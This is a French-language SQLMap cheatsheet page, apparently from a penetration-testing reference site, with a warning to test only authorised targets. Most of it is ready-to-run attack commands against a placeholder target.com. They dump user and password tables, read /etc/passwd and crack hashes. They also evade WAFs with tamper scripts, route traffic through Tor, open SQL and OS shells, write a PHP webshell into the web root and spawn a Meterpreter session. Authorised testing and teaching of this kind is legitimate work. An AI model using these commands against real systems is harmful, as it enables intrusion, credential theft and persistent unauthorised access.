SQLMap
Détection et exploitation automatique des injections SQL
Web SQLi Automatisé
⚠️
Utilisez SQLMap uniquement sur des applications web dont vous êtes propriétaire ou pour lesquelles vous avez une autorisation écrite explicite.

📦 Installation

Installation
# Kali Linux (préinstallé)
sqlmap --version

# Depuis GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python3 sqlmap.py --version

# pip
pip3 install sqlmap

⚙️ Générateur de commande

sqlmap -u "http://target.com/page?id=1"

📋 Cheatsheet complet

Découverte et énumération

Reconnaissance SQLi
# Test de base sur paramètre GET
sqlmap -u "http://target.com/page?id=1"

# Mode non-interactif (recommandé en automatisation)
sqlmap -u "http://target.com/page?id=1" --batch

# Lister toutes les bases de données
sqlmap -u "http://target.com/page?id=1" --dbs

# Lister les tables d'une base
sqlmap -u "http://target.com/page?id=1" -D mydb --tables

# Lister les colonnes d'une table
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --columns

# Dumper une table entière
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump

# Dumper colonnes spécifiques
sqlmap -u "http://target.com/page?id=1" -D mydb -T users -C username,password --dump

# Utilisateur de la BDD et droits
sqlmap -u "http://target.com/page?id=1" --current-user --current-db --is-dba

Requêtes POST et authentification

POST / Sessions
# Paramètre POST
sqlmap -u "http://target.com/login" --data "username=test&password=test"

# Avec cookie de session
sqlmap -u "http://target.com/page?id=1" --cookie "PHPSESSID=abc123; auth=1"

# Depuis un fichier requête HTTP (Burp Suite export)
sqlmap -r request.txt

# Avec header HTTP custom
sqlmap -u "http://target.com/page?id=1" -H "Authorization: Bearer TOKEN"

# Injection dans un header
sqlmap -u "http://target.com/" -p User-Agent --level 3

# Crawler automatique du site
sqlmap -u "http://target.com/" --crawl=3 --forms --batch

Bypass WAF et évasion

WAF Bypass
# User-Agent aléatoire
sqlmap -u "http://target.com/page?id=1" --random-agent

# Tamper scripts pour bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment

# Tampers courants
# space2comment    — remplace espaces par /**/ 
# between          — ajoute BETWEEN au lieu de = 
# randomcase       — casse aléatoire (SeLeCt)
# base64encode     — encode les payloads en base64
# charencode       — encode URL les caractères
# hex2char         — convertit les strings en hex

# Délai entre requêtes
sqlmap -u "http://target.com/page?id=1" --delay=2

# Via Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --check-tor

# Proxy Burp Suite
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080

Exploitation avancée

Post-exploitation SQLi
# Shell SQL interactif
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Shell OS (si privileges suffisants)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Lire un fichier sur le serveur
sqlmap -u "http://target.com/page?id=1" --file-read=/etc/passwd

# Écrire un fichier (webshell)
sqlmap -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Cracker les hashes automatiquement
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --passwords

# Obtenir un Meterpreter (Metasploit)
sqlmap -u "http://target.com/page?id=1" --os-pwn --msf-path=/usr/share/metasploit-framework

Techniques d'injection

Techniques SQLMap (-technique)
# Forcer une technique spécifique
sqlmap -u "http://target.com/page?id=1" --technique=B

Techniques disponibles :
B  — Boolean-based blind
E  — Error-based
U  — UNION query-based
S  — Stacked queries
T  — Time-based blind
Q  — Inline queries

# Combinaison (défaut = BEUSTQ)
sqlmap -u "http://target.com/page?id=1" --technique=BET
